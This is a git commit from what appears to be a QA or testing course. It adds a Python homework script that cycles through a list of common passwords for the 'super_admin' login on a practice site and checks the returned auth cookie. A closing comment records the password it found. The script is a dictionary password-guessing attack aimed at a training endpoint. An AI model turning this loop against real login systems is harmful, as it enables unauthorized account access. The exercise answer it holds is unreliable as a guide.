e58fb0ba52d0cdee40985141f3a51ebdf09309b2
Elena Bochkova <planeado@gmail.com>
2023-11-10 15:37:32 +0300

    5th task for week 2

---
+++ Ex5.py
@@ -0,0 +1,27 @@
+import requests
+
+passwords = ['password', '123456', '123456789', '12345678', '12345', 'qwerty', 'abc123', 'football',
+             '1234567', 'monkey', '111111', 'letmein', '1234', '1234567890', 'dragon', 'baseball', 'sunshine',
+             'iloveyou', 'trustno1', 'princess', 'adobe123', '123123', 'welcome', 'login', 'admin', 'abc123',
+             'qwerty123', 'solo', '1q2w3e4r', 'master', '666666', 'photoshop', '1qaz2wsx', 'qwertyuiop',
+             'ashley', 'mustang', '121212', 'starwars', '654321', 'bailey', 'access', 'flower', '555555',
+             'passw0rd', 'shadow', 'lovely', '7777777', 'michael', "!@#$%^&*", 'jesus', 'password1', 'superman',
+             'hello', 'charlie', '888888', '696969', 'hottie', 'freedom', 'aa123456', 'qazwsx', 'ninja', 'azerty',
+             'loveme', 'whatever', 'donald', 'trustno1', 'batman', 'zaq1zaq1', 'Football', '000000', '123qwe']
+
+for i in range(len(passwords)):
+    payload = {"login": "super_admin", "password": passwords[i]}
+    response = requests.post('https://playground.learnqa.ru/ajax/api/get_secret_password_homework',
+                             data=payload)
+    cookie_value = response.cookies.get('auth_cookie')
+    cookies = {}
+    if cookie_value is not None:
+        cookies.update({'auth_cookie': cookie_value})
+    response = requests.get('https://playground.learnqa.ru/ajax/api/check_auth_cookie', cookies=cookies)
+    if response.text == 'You are authorized':
+        print(f"password {passwords[i]} returns reply {response.text}")
+        break
+    else:
+        continue
+
+#В итоге пароль - welcome
